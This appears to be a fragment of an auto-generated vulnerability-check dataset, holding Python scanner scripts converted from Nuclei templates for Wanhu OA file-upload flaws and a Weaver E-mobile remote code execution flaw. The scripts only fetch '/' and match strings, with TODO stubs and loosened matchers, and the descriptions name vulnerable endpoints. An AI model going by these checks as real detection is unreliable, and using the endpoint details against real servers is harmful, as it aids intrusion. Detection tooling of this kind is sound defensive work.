        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wanhuoa-officeserverservlet-file-upload\nName: Wanhu OA OfficeServerServlet - Arbitrary File Upload\nSeverity: critical\nDescription: Wanhu OA officeserverservlet file upload vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wanhuoa_officeserverservlet_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wanhuoa-officeserverservlet-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Wanhu OA OfficeServerServlet - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'DBSTEP V3.0, Post' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['DBSTEP V3.0, Post']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wanhu OA OfficeServerServlet - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wanhuoa_officeserverservlet_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wanhuoa-officeserverservlet-file-upload\nName: Wanhu OA OfficeServerServlet - Arbitrary File Upload\nSeverity: critical\nDescription: Wanhu OA officeserverservlet file upload vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wanhuoa_officeserverservlet_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wanhuoa-officeserverservlet-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Wanhu OA OfficeServerServlet - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'DBSTEP V3.0, Post' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['DBSTEP V3.0, Post']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wanhu OA OfficeServerServlet - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wanhuoa_officeserverservlet_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "wanhu",
          "oa",
          "officeserver",
          "fileupload",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wanhuoa_smartupload_file_upload",
        "name": "Wanhu OA smartUpload.jsp - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Wanhu OA smartUpload.jsp file has a file upload interface and does not filter file types, resulting in arbitrary file upload vulnerabilities. Malicious JSP files can be uploaded directly.",
        "severity": "critical",
        "detection": "[AND] mot(s) '请选择要上传的文件, <TITLE>上传附件</TITLE>' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wanhuoa-smartupload-file-upload\nName: Wanhu OA smartUpload.jsp - Arbitrary File Upload\nSeverity: critical\nDescription: Wanhu OA smartUpload.jsp file has a file upload interface and does not filter file types, resulting in arbitrary file upload vulnerabilities. Malicious JSP files can be uploaded directly.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wanhuoa_smartupload_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wanhuoa-smartupload-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Wanhu OA smartUpload.jsp - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '请选择要上传的文件, <TITLE>上传附件</TITLE>' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['请选择要上传的文件, <TITLE>上传附件</TITLE>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wanhu OA smartUpload.jsp - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wanhuoa_smartupload_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wanhuoa-smartupload-file-upload\nName: Wanhu OA smartUpload.jsp - Arbitrary File Upload\nSeverity: critical\nDescription: Wanhu OA smartUpload.jsp file has a file upload interface and does not filter file types, resulting in arbitrary file upload vulnerabilities. Malicious JSP files can be uploaded directly.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wanhuoa_smartupload_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wanhuoa-smartupload-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Wanhu OA smartUpload.jsp - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '请选择要上传的文件, <TITLE>上传附件</TITLE>' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['请选择要上传的文件, <TITLE>上传附件</TITLE>']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wanhu OA smartUpload.jsp - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wanhuoa_smartupload_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "wanhu",
          "oa",
          "smartupload",
          "file-upload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_e_mobile_rce",
        "name": "Weaver E-mobile client.do - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "E-Mobile 6.0 has a command execution vulnerability. It has now been confirmed that this vulnerability can be exploited by an attacker. In some cases, user input may be passed directly to the command execution function of the underlying operating system. An attacker can insert special characters or Command sequence to trick the application into executing it as a valid command, thus gaining command execution permissions from the server.",
        "severity": "critical",
        "detection": "[AND] DSL: status_code == 200; contains(body,'Windows IP Configuration') | mot(s) 'application/json, text/html'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-e-mobile-rce\nName: Weaver E-mobile client.do - Remote Code Execution\nSeverity: critical\nDescription: E-Mobile 6.0 has a command execution vulnerability. It has now been confirmed that this vulnerability can be exploited by an attacker. In some cases, user input may be passed directly to the command execution function of the underlying operating system. An attacker can insert special characters or Command sequence to trick the application into executing it as a valid command, thus gaining command execution permissions from the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_e_mobile_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-e-mobile-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Weaver E-mobile client.do - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: status_code == 200; contains(body,'Windows IP Configuration') | mot(s) 'application/json, text/html'\"\n\n        # Simple word matcher simulation\n        matchers = ['Windows IP Configuration', 'application/json, text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Weaver E-mobile client.do - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_e_mobile_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
